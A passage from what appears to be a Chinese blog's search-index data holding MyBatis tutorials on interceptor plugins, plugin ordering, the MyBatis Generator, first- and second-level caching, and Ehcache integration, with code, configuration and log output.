org.apache.ibatis.plugin.Signature;@Intercepts({ @Signature(type = StatementHandler.class, method = "prepare", args = { Connection.class, Integer.class }) })public class MyFirstPlugin implements Interceptor { private Properties properties = new Properties(); /** * 拦截目标对象的目标方法的执行 */ @Override public Object intercept(Invocation invocation) throws Throwable { System.out.println("MyFirstPlugin ==&gt; " + invocation.getTarget().getClass().getName() + "." + invocation.getMethod().getName() + "() 方法准备执行"); Object result = invocation.proceed(); System.out.println("MyFirstPlugin ==&gt; " + invocation.getTarget().getClass().getName() + "." + invocation.getMethod().getName() + "() 方法执行完成"); return result; } /** * 为目标对象创建一个代理对象 */ @Override public Object plugin(Object target) { System.out.println("MyFirstPlugin ==&gt; 要包装的对象: " + target); Object wrap = Plugin.wrap(target, this); return wrap; } /** * 将插件注册时的Property属性设置进来 */ @Override public void setProperties(Properties properties) { this.properties = properties; }} 在 MyBatis 的全局配置文件中注册插件 12345678910&lt;configuration&gt; &lt;!-- 注册插件 --&gt; &lt;plugins&gt; &lt;plugin interceptor="com.clay.mybatis.plugin.MyFirstPlugin"&gt; &lt;property name="name" value="FirstPlugin" /&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; 上面自定义的插件将会拦截在 StatementHandler 实例中所有的 prepare() 方法调用，MyBatis 执行普通的 SQL 查询语句后，控制台输出的日志信息如下： 123456789101112MyFirstPlugin ==&gt; 要包装的对象: org.apache.ibatis.executor.CachingExecutor@69fb6037MyFirstPlugin ==&gt; 要包装的对象: org.apache.ibatis.scripting.defaults.DefaultParameterHandler@11bd0f3bMyFirstPlugin ==&gt; 要包装的对象: org.apache.ibatis.executor.resultset.DefaultResultSetHandler@696da30bMyFirstPlugin ==&gt; 要包装的对象: org.apache.ibatis.executor.statement.RoutingStatementHandler@4e7912d822:16:06,391 DEBUG JdbcTransaction:137 - Opening JDBC Connection22:16:06,755 DEBUG PooledDataSource:434 - Created connection 208684473.22:16:06,755 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@c7045b9]MyFirstPlugin ==&gt; org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare() 方法准备执行22:16:06,761 DEBUG getEmpById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?MyFirstPlugin ==&gt; org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare() 方法执行完成22:16:06,801 DEBUG getEmpById:137 - ==&gt; Parameters: 1(Long)22:16:06,831 DEBUG getEmpById:137 - &lt;== Total: 0 插件开发案例二在下面的案例代码里，演示了如何动态更改 SQL 语句运行时的参数，例如查询员工信息时，动态更改查询的员工 ID 为 11。 Mapper 接口 12345public interface EmployeeMapper { public Employee getEmpById(Long id);} SQL 映射文件 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpById" parameterType="Long" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 自定义插件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package com.clay.mybatis.plugin;import java.sql.Connection;import java.util.Properties;import org.apache.ibatis.executor.statement.StatementHandler;import org.apache.ibatis.plugin.Interceptor;import org.apache.ibatis.plugin.Intercepts;import org.apache.ibatis.plugin.Invocation;import org.apache.ibatis.plugin.Plugin;import org.apache.ibatis.plugin.Signature;import org.apache.ibatis.reflection.MetaObject;import org.apache.ibatis.reflection.SystemMetaObject;/** * 插件签名：告诉 MyBatis 当前插件要拦截哪个对象的哪个方法 */@Intercepts({ @Signature(type = StatementHandler.class, method = "prepare", args = { Connection.class, Integer.class }) })public class MyThirdPlugin implements Interceptor { private Properties properties = new Properties(); /** * 拦截目标对象的目标方法的执行 */ @Override public Object intercept(Invocation invocation) throws Throwable { // 获取目标对象 Object target = invocation.getTarget(); // 分离被代理对象的元数据 MetaObject metaObject = SystemMetaObject.forObject(target); // 更改 SQL 语句要用的参数 metaObject.setValue("parameterHandler.parameterObject", 11L); // 执行目标方法 Object proceed = invocation.proceed(); // 返回执行结果 return proceed; } /** * 为目标对象创建一个代理对象 */ @Override public Object plugin(Object target) { Object wrap = Plugin.wrap(target, this); return wrap; } /** * 将插件注册时的Property属性设置进来 */ @Override public void setProperties(Properties properties) { this.properties = properties; }} 注册插件 12345678910&lt;configuration&gt; &lt;!-- 注册插件 --&gt; &lt;plugins&gt; &lt;plugin interceptor="com.clay.mybatis.plugin.MyThirdPlugin"&gt; &lt;property name="name" value="MyThirdPlugin" /&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; 业务代码 12345678910111213141516171819public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); mapper.getEmpById(5L); } finally { if (session != null) { session.close(); } } }} 执行结果 12322:36:57,053 DEBUG getEmpById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?22:36:57,089 DEBUG getEmpById:137 - ==&gt; Parameters: 11(Long)22:36:57,118 DEBUG getEmpById:137 - &lt;== Total: 0 多个插件的执行顺序MyBatis 在创建动态代理时，是按照插件的配置顺序依次调用 plugin() 方法创建层层的代理对象，但插件的 intercept() 方法是按照配置信息的逆向顺序来执行，即先配置的插件会后执行。 在上面案例代码的基础上，增加一个 MyBatis 插件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package com.clay.mybatis.plugin;import java.sql.Connection;import java.util.Properties;import org.apache.ibatis.executor.statement.StatementHandler;import org.apache.ibatis.plugin.Interceptor;import org.apache.ibatis.plugin.Intercepts;import org.apache.ibatis.plugin.Invocation;import org.apache.ibatis.plugin.Plugin;import org.apache.ibatis.plugin.Signature;/** * 插件签名：告诉 MyBatis 当前插件要拦截哪个对象的哪个方法 */@Intercepts({ @Signature(type = StatementHandler.class, method = "prepare", args = { Connection.class, Integer.class }) })public class MySecondPlugin implements Interceptor { private Properties properties = new Properties(); /** * 拦截目标对象的目标方法的执行 */ @Override public Object intercept(Invocation invocation) throws Throwable { System.out.println("MySecondPlugin ==&gt; " + invocation.getTarget().getClass().getName() + "." + invocation.getMethod().getName() + "() 方法准备执行"); Object result = invocation.proceed(); System.out.println("MySecondPlugin ==&gt; " + invocation.getTarget().getClass().getName() + "." + invocation.getMethod().getName() + "() 方法执行完成"); return result; } /** * 为目标对象创建一个代理对象 */ @Override public Object plugin(Object target) { System.out.println("MySecondPlugin ==&gt; 要包装的对象: " + target); Object wrap = Plugin.wrap(target, this); return wrap; } /** * 将插件注册时的Property属性设置进来 */ @Override public void setProperties(Properties properties) { this.properties = properties; }} 在 MyBatis 的全局配置文件中同时注册多个插件 12345678910111213&lt;configuration&gt; &lt;!-- 注册插件 --&gt; &lt;plugins&gt; &lt;plugin interceptor="com.clay.mybatis.plugin.MyFirstPlugin"&gt; &lt;property name="name" value="FirstPlugin" /&gt; &lt;/plugin&gt; &lt;plugin interceptor="com.clay.mybatis.plugin.MySecondPlugin"&gt; &lt;property name="name" value="SecondPlugin" /&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; MyBatis 执行普通的 SQL 查询语句后，控制台输出的日志信息如下： 123456789101112131415161718MyFirstPlugin ==&gt; 要包装的对象: org.apache.ibatis.executor.CachingExecutor@36d585cMySecondPlugin ==&gt; 要包装的对象: org.apache.ibatis.executor.CachingExecutor@36d585cMyFirstPlugin ==&gt; 要包装的对象: org.apache.ibatis.scripting.defaults.DefaultParameterHandler@c333c60MySecondPlugin ==&gt; 要包装的对象: org.apache.ibatis.scripting.defaults.DefaultParameterHandler@c333c60MyFirstPlugin ==&gt; 要包装的对象: org.apache.ibatis.executor.resultset.DefaultResultSetHandler@4e7912d8MySecondPlugin ==&gt; 要包装的对象: org.apache.ibatis.executor.resultset.DefaultResultSetHandler@4e7912d8MyFirstPlugin ==&gt; 要包装的对象: org.apache.ibatis.executor.statement.RoutingStatementHandler@53976f5cMySecondPlugin ==&gt; 要包装的对象: org.apache.ibatis.executor.statement.RoutingStatementHandler@53976f5c22:57:50,780 DEBUG JdbcTransaction:137 - Opening JDBC Connection22:57:51,071 DEBUG PooledDataSource:434 - Created connection 261748192.22:57:51,071 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@f99f5e0]MySecondPlugin ==&gt; com.sun.proxy.$Proxy9.prepare() 方法准备执行MyFirstPlugin ==&gt; org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare() 方法准备执行22:57:51,078 DEBUG getEmpById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?MyFirstPlugin ==&gt; org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare() 方法执行完成MySecondPlugin ==&gt; com.sun.proxy.$Proxy9.prepare() 方法执行完成22:57:51,133 DEBUG getEmpById:137 - ==&gt; Parameters: 1(Long)22:57:51,173 DEBUG getEmpById:137 - &lt;== Total: 0 MyBatis 代码生成器MyBatis Generator（简称 MBG），是一个专门为 MyBatis 框架使用者定制的代码生成器（逆向工程），可以快速地根据数据库表生成对应的 SQL 映射文件、Mapper 接口以及 JavaBean 类。支持基本的增删改查，以及 QBC 风格的条件查询。但是像数据库表连接、存储过程等这些复杂 SQL 的定义需要开发者手工编写。更多的介绍内容，可查看 GitHub 仓库 和 MyBatis 官方文档。 准备工作下述的案例代码是基于以下的数据库表结构编写的，因此需要提前执行 SQL 语句来初始化数据库。 1234567891011121314151617181920CREATE DATABASE `mybatis_lesson` DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `t_department` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `dept_id` int(11) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_department(id, name) values(1, \'开发部门\'), (2, \'测试部门\');insert into t_employee(id, last_name, gender, email, dept_id) values(1, \'Jim\',\'1\', \'jim@gmail.com\', 1);insert into t_employee(id, last_name, gender, email, dept_id) values(2, \'Peter\',\'1\', \'peter@gmail.com\', 1); 使用案例本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-19。 引入 Maven 依赖1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.23&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.dynamic-sql&lt;/groupId&gt; &lt;artifactId&gt;mybatis-dynamic-sql&lt;/artifactId&gt; &lt;version&gt;1.4.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;1.4.1&lt;/version&gt;&lt;/dependency&gt; 创建 XML 配置文件在项目的 src/test/resources 目录下创建 mybatis-generator.xml 配置文件，其中的配置内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE generatorConfiguration PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN" "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd"&gt;&lt;generatorConfiguration&gt; &lt;context id="MySQLTables" targetRuntime="MyBatis3Simple"&gt; &lt;!-- 数据库连接信息 --&gt; &lt;jdbcConnection driverClass="com.mysql.cj.jdbc.Driver" connectionURL="jdbc:mysql://127.0.0.1:3306/mybatis_lesson" userId="root" password="123456" /&gt; &lt;!-- Java 类型解析 --&gt; &lt;javaTypeResolver&gt; &lt;property name="forceBigDecimals" value="false" /&gt; &lt;/javaTypeResolver&gt; &lt;!-- JavaBean 生成策略 --&gt; &lt;javaModelGenerator targetPackage="com.clay.mybatis.bean" targetProject="./src/main/java"&gt; &lt;property name="enableSubPackages" value="true" /&gt; &lt;property name="trimStrings" value="true" /&gt; &lt;/javaModelGenerator&gt; &lt;!-- SQL 映射文件生成策略 --&gt; &lt;sqlMapGenerator targetPackage="com.clay.mybatis.dao" targetProject="./src/main/java"&gt; &lt;property name="enableSubPackages" value="true" /&gt; &lt;/sqlMapGenerator&gt; &lt;!-- Mapper 接口类生成策略 --&gt; &lt;javaClientGenerator type="XMLMAPPER" targetPackage="com.clay.mybatis.dao" targetProject="./src/main/java"&gt; &lt;property name="enableSubPackages" value="true" /&gt; &lt;/javaClientGenerator&gt; &lt;!-- 数据库表与 JavaBean 的映射 --&gt; &lt;table tableName="t_employee" domainObjectName="Employee" /&gt; &lt;table tableName="t_department" domainObjectName="Department" /&gt; &lt;/context&gt;&lt;/generatorConfiguration&gt; 上述 XML 配置文件里的 targetRuntime="MyBatis3Simple" 表示只生成基础的 CRUD 代码和少量动态 SQL 语句，可选值有 MyBatis3DynamicSql | MyBatis3Kotlin | MyBatis3 | MyBatis3Simple。值得一提的是，在企业项目开发中，用得最多的是 targetRuntime="MyBatis3"，它支持复杂条件查询（QBC 查询）和自动生成大量动态 SQL 语句。MyBatis Generator 完整的 XML 标签介绍可看 这里。 运行代码生成器MyBatis Generator (MBG) 可以通过以下方式运行： From the command prompt with an XML configuration As an Ant task with an XML configuration As a Maven Plugin From another Java program with an XML configuration From another Java program with a Java based configuration As an Eclipse Feature 这里采用 Java 代码 + XML 配置文件的方式运行代码生成器，示例代码如下： 12345678910111213141516171819202122232425import java.io.File;import java.net.URL;import java.util.ArrayList;import java.util.List;import org.mybatis.generator.api.MyBatisGenerator;import org.mybatis.generator.config.Configuration;import org.mybatis.generator.config.xml.ConfigurationParser;import org.mybatis.generator.internal.DefaultShellCallback;public class GeneratorTest { public static void main(String[] args) throws Exception { List&lt;String&gt; warnings = new ArrayList&lt;String&gt;(); boolean overwrite = true; URL url = GeneratorTest.class.getClassLoader().getResource("mybatis-generator.xml"); File configFile = new File(url.getFile()); ConfigurationParser cp = new ConfigurationParser(warnings); Configuration config = cp.parseConfiguration(configFile); DefaultShellCallback callback = new DefaultShellCallback(overwrite); MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings); myBatisGenerator.generate(null); }} 最后会在项目的目录内自动生成 JavaBean 类、Mapper 接口和 SQL 映射文件，项目的目录结构图如下： MyBatis 工作原理工作原理图一 工作原理图二 工作原理图三 MyBatis 源码分析 一本小小的 MyBatis 源码分析书 怒肝一夜 | Mybatis 源码深度解析 MyBatis 3.x 源码深度解析与最佳实践 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"Java 大数据知识图谱 (最新)",url:"/posts/9e38efb3.html",text:'基础知识体系 Hadoop 生态体系 Spark 生态体系 机器学习和算法 平台架构师体系 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"知识图谱"},{title:"MyBatis 入门教程之六",url:"/posts/77bb067c.html",text:'大纲 MyBatis 入门教程之一 MyBatis 入门教程之二 MyBatis 入门教程之三 MyBatis 入门教程之四 MyBatis 入门教程之五 MyBatis 入门教程之六 MyBatis 入门教程之七 MyBatis 入门教程之八 缓存机制MyBatis 内置了一个强大的事务性查询缓存机制，它可以非常方便地配置和定制。MyBatis 中默认定义了两级缓存： 一级缓存和二级缓存 默认情况下，只有一级缓存（SqlSession 级别的缓存，也称为本地缓存）开启 二级缓存需要手动开启和配置，它是基于 namespace 级别的缓存 为了提高扩展性，MyBatis 定义了缓存接口 Cache，可以通过实现 Cache 接口来自定义二级缓存 一级缓存一级缓存介绍 一级缓存（local cache），即本地缓存，作用域默认为 SqlSession。当 Session 执行 flush 或 close 操作后，该 Session 中的所有 Cache 将被清空。 本地缓存默认是一直开启的（不能被关闭），但可以调用 sqlSession.clearCache() 来清空本地缓存，或者改变缓存的作用域。 在 MyBatis 3.1 之后，支持配置本地缓存的作用域，在 mybatis.xml 中配置 localCacheScope 属性即可。MyBatis 利用本地缓存可以防止循环引用和加速重复嵌套查询。localCacheScope 属性的可选值为 SESSION | STATEMENT，默认值为 SESSION，这种情况下会缓存一个会话中执行的所有查询。若设置值为 STATEMENT，本地会话仅用在语句执行上，对相同 SqlSession 的不同调用将不会共享数据。 同一个会话期间，只要查询过的数据都会被保存在当前 SqlSession 的一个 Map 中，它的 key 由 HashCode + 查询的 SqlId + 编写的 SQL 查询语句 + 参数 构成。 一级缓存使用案例本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-16。 12345678910111213141516171819202122232425262728public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); // 第一次查询 Employee employee = mapper.getEmpById(1L); // 第二次查询 Employee employee2 = mapper.getEmpById(1L); // 判断两次查询到的对象的地址是否一致 System.out.println(employee == employee2); } finally { if (session != null) { session.close(); } } }} 上述代码执行之后，可以发现 MyBatis 只会发出一条 SQL 语句（如下所示），且两次查询到的对象的地址是相同的，即属于同一个对象，这是由于 MyBatis 一级缓存（默认开启）起的作用。 123422:36:12,278 DEBUG getEmpById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?22:36:12,317 DEBUG getEmpById:137 - ==&gt; Parameters: 1(Long)22:36:12,350 DEBUG getEmpById:137 - &lt;== Total: 1true 一级缓存失效的场景一级缓存失效的四种场景： 使用不同的 SqlSession 进行查询 同一个 SqlSession，但是查询条件不同 同一个 SqlSession，但是在两次查询期间手动清空了一级缓存 同一个 SqlSession，但是在两次查询期间执行了任何一次增删改操作 二级缓存二级缓存介绍 二级缓存默认不开启，需要手动配置 二级缓存在 SqlSession 提交或关闭之后才会生效 MyBatis 提供二级缓存的接口以及实现，缓存实现要求 POJO 实现 Serializable 接口 当 SqlSession 提交或者关闭后，一级缓存中的数据会被保存到二级缓存中，下次使用新的会话进行查询时，就可以使用到二级缓存的数据 二级缓存（second level cache）是全局作用域缓存，并且是基于 namespace 级别的缓存，一个 namespace 对应一个二级缓存；不同 namespace 查询出的数据会放在自己对应的缓存（Map）中 二级缓存启用步骤 第一步、在 MyBatis 的全局配置文件中开启二级缓存 &lt;setting name= "cacheEnabled" value="true"/&gt; 第二步、在需要使用二级缓存的 SQL 映射文件里添加 &lt;cache&gt; 标签来配置缓存 第三步、POJO（Plain Ordinary Java Object - 简单的 Java 对象）需要实现 Serializable 接口 二级缓存相关属性在 MyBatis 的 SQL 映射文件中，&lt;cache&gt; 标签拥有以下属性： 二级缓存相关设置 全局配置中的 cacheEnable 标签：启用二级缓存的开关，二级缓存默认是关闭的，一级缓存是一直是开启的 select 标签的 useCache 属性：配置当前的 select 语句是否使用二级缓存，一级缓存一直是使用的 SQL 标签的 flushCache 属性：增删改操作默认是 flushCache=true，即 SQL 执行以后会同时清空一级和二级缓存，而查询操作默认是 flushCache=false sqlSession.clearCache()：只是用来清除一级缓存 全局配置中的 localCacheScope 属性：本地缓存作用域（SESSION | STATEMENT），设置为 SESSION 时，当前会话的所有数据会被缓存到会话里；设置值为 STATEMENT 时，本地会话仅用在语句执行上，对相同 SqlSession 的不同调用将不会共享数据 值得一提的是，当在某一个作用域（一级缓存 / 二级缓存) 进行了增删改操作后，默认该作用域下的所有缓存数据将被清空。 二级缓存使用案例本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-17。 特别注意 1、二级缓存在 SqlSession 提交或关闭之后才会生效 2、当 SqlSession 提交或者关闭后，一级缓存中的数据会被保存到二级缓存中，下次使用新的会话进行查询时，就可以使用到二级缓存的数据 全局配置文件 12345678910111213&lt;configuration&gt; &lt;!-- 开启二级缓存 --&gt; &lt;settings&gt; &lt;setting name="cacheEnabled" value="true" /&gt; &lt;/settings&gt; &lt;!-- SQL映射文件 --&gt; &lt;mappers&gt; &lt;mapper resource="com/clay/mybatis/dao/EmployeeMapper.xml" /&gt; &lt;/mappers&gt;&lt;/configuration&gt; SQL 映射文件 123456789101112&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- 使用二级缓存 --&gt; &lt;cache /&gt; &lt;select id="getEmpById" parameterType="Long" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; Java 代码 1234567891011121314151617181920212223242526272829303132333435public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); SqlSession session2 = sqlSessionFactory.openSession(); try { // 第一次查询 EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); Employee employee = mapper.getEmpById(1L); // 会话提交 session.commit(); // 第二次查询 EmployeeMapper mapper2 = session2.getMapper(EmployeeMapper.class); Employee employee2 = mapper2.getEmpById(1L); // 会话提交 session2.commit(); } finally { closeSesson(session); closeSesson(session2); } } public static void closeSesson(SqlSession session) { if (session != null) { session.close(); session = null; } }} 执行上述的代码，可以发现 MyBatis 只会发出一条 SQL 语句（如下所示），这说明二级缓存起了作用。 12322:55:46,112 DEBUG getEmpById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?22:55:46,164 DEBUG getEmpById:137 - ==&gt; Parameters: 1(Long)22:55:46,203 DEBUG getEmpById:137 - &lt;== Total: 1 一级与二级缓存原理图解 整合 Ehcache 第三方缓存EhCache 是一个纯 Java 实现的进程内缓存框架，具有快速、精干等特点，是 Hibernate 中默认的 CacheProvider。 Ehcache 第三方缓存整合步骤 1、引入核心的依赖包，包括 Ehcache 包、MyBatis 整合包、日志包 12345678910111213141516171819202122232425&lt;dependency&gt; &lt;groupId&gt;net.sf.ehcache&lt;/groupId&gt; &lt;artifactId&gt;ehcache-core&lt;/artifactId&gt; &lt;version&gt;2.6.11&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.caches&lt;/groupId&gt; &lt;artifactId&gt;mybatis-ehcache&lt;/artifactId&gt; &lt;version&gt;1.2.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.30&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;1.7.30&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.17&lt;/version&gt;&lt;/dependency&gt; 2、在项目的 src/main/resources 目录下创建 ehcache.xml 配置文件 1234567891011121314151617&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;ehcache xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="../config/ehcache.xsd"&gt; &lt;diskStore path="/tmp/ehcache" /&gt; &lt;defaultCache maxElementsInMemory="10000" maxElementsOnDisk="10000000" eternal="false" overflowToDisk="true" timeToIdleSeconds="120" timeToLiveSeconds="120" diskExpiryThreadIntervalSeconds="120" memoryStoreEvictionPolicy="LRU"&gt; &lt;/defaultCache&gt;&lt;/ehcache&gt; 标签 说明 diskStore 指定缓存数据在磁盘中的存储位置 defaultCache 当借助 CacheManager.add("demoCache") 创建 Cache 时，EhCache 便会采用 &lt;defalutCache&gt; 标签指定的的缓存管理策略 属性 必填 说明 maxElementsInMemory 是 在内存中缓存的 Element 的最大数量 maxElementsOnDisk 是 在磁盘上缓存的 Element 的最大数量，若是 0 则表示无穷大 eternal 是 设定缓存的 Elements 是否永远不过期。如果为 true，则缓存的数据始终有效，如果为 false ，则需要根据 timeToIdleSeconds 与 timeToLiveSeconds 进行判断 overflowToDisk 是 设定当内存缓存溢出的时候，是否将过期的 Element 缓存到磁盘上 timeToIdleSeconds 否 当缓存在 EhCache 中的数据前后两次访问的时间超过 timeToIdleSeconds 的属性取值时，这些数据便会删除，默认值是 0，表示缓存数据的可闲置时间无穷大 timeToLiveSeconds 否 缓存 Element 的有效生命期，默认是 0，表示 Element 的存活时间无穷大 diskSpoolBufferSizeMB 否 这个参数设置 DiskStore（磁盘缓存） 的缓存区大小。默认是 30MB，每个 Cache 都应该有自己的一个缓冲区 diskPersistent 否 在 VM 重启的时候是否启用磁盘保存 EhCache 中的数据，默认是 false diskExpiryThreadIntervalSeconds 否 磁盘缓存的清理线程运行间隔，默认是 120 秒。每隔 120 秒，相应的线程会进行一次 EhCache 中数据的清理工作 memoryStoreEvictionPolicy 否 当内存缓存达到最大，有新的 Element 加入的时候，移除缓存中 Element 的策略。默认是 LRU（最近最少使用），可选值还有 LFU（最不常使用） 和 FIFO（先进先出） 3、配置 MyBatis 全局配置文件，开启二级缓存 12345678&lt;configuration&gt; &lt;!-- 开启二级缓存 --&gt; &lt;settings&gt; &lt;setting name="cacheEnabled" value="true" /&gt; &lt;/settings&gt;&lt;/configuration&gt; 4、配置 SQL 映射文件，添加 &lt;cache&gt; 标签 123456&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- 指定 EhCache 作为二级缓存的实现 --&gt; &lt;cache type="org.mybatis.caches.ehcache.EhcacheCache"/&gt;&lt;/mapper&gt; 提示 二级缓存是全局作用域缓存，并且是基于 namespace 级别的缓存，一个 namespace 对应一个二级缓存，不同 namespace 查询出的数据会放在自己对应的缓存（Map）中 若想在命名空间（namespace）中共享相同的缓存配置和实例，则可以在 SQL 映射文件里使用 &lt;cache-ref&gt; 标签来引用另外一个缓存 假设在 DepartmentMapper.xml 映射文件中，想引用 com.clay.mybatis.dao.EmployeeMapper 命名空间的二级缓存，可以使用 &lt;cache-ref&gt; 标签来实现： 123456&lt;mapper namespace="com.clay.mybatis.dao.DepartmentMapper"&gt; &lt;!-- 引用缓存，namespace：指定和哪个命名空间下的二级缓存一样 --&gt; &lt;cache-ref namespace="com.clay.mybatis.dao.EmployeeMapper"/&gt;&lt;/mapper&gt; 5、验证整合结果 运行项目后，若输出的日志信息里有下面类似的内容，则说明 MyBatis 成功整合了 EhCache，或者可以查看 &lt;diskStore&gt; 标签指定的存储位置下有没有生成数据文件来验证整合结果。 12323:35:03,108 DEBUG Segment:425 - put added 0 on heap23:35:03,128 DEBUG Segment:779 - fault removed 0 from heap23:35:03,129 DEBUG Segment:796 - fault added 0 on disk 使用第三方缓存的查询流程图当执行一条查询 SQL 时，首先从二级缓存中进行查询，然后进入一级缓存中查询，最后执行 JDBC 查询。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"Java 架构师知识图谱 (最新)",url:"/posts/49881333.html",text:'JEE 基础之一 JEE 基础之二 Java 高级架构师 Java 百万架构师 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": 